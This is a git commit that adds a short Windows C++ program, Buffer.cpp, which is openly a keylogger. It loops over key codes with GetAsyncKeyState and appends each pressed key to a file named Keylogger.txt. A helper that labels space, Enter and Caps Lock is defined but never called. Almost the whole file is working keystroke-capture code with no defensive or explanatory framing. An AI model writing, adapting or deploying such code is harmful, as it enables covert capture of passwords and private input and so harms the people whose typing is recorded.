40b4c950f46290883b63695d011a742988396f94
Walczy <60795188+walczy@users.noreply.github.com>
2021-01-29 02:31:14 +0100

    Add files via upload

---
+++ Buffer/Buffer/Buffer.cpp
@@ -0,0 +1,63 @@
+#define _WIN32_WINNT 0x0500
+#include <Windows.h>
+#include <string>
+#include <stdlib.h>
+#include <stdio.h>
+#include <iostream>
+#include <fstream>
+
+
+
+using namespace std;
+
+void flog(string g);
+
+bool Otg(int key)
+{
+	switch (key) {
+	case VK_SPACE:
+		flog(" ");
+		return true;
+	case VK_RETURN:
+		flog("[RETURN]");
+		return true;
+	case VK_CAPITAL:
+		flog("[CAPS LOCK]");
+	default:
+		return false;
+	}
+}
+
+
+
+int main()
+{
+	ShowWindow(GetConsoleWindow(), SW_SHOW);
+
+	while (true) {
+		Sleep(10);
+		for (int KEY = 8; KEY <= 190; KEY++)
+		{
+			if (GetAsyncKeyState(KEY) == -32767) {
+
+					fstream Keylogger;
+					Keylogger.open("Keylogger.txt", fstream::app);
+					if (Keylogger.is_open()) {
+						Keylogger << char(KEY);
+						Keylogger.close();
+					}
+					
+				}
+			}
+		}
+	}
+
+void flog(string g)
+{
+	fstream Keylogger;
+	Keylogger.open("Keylogger.txt", fstream::app);
+	if (Keylogger.is_open()) {
+		Keylogger << g;
+		Keylogger.close();
+	}
+}
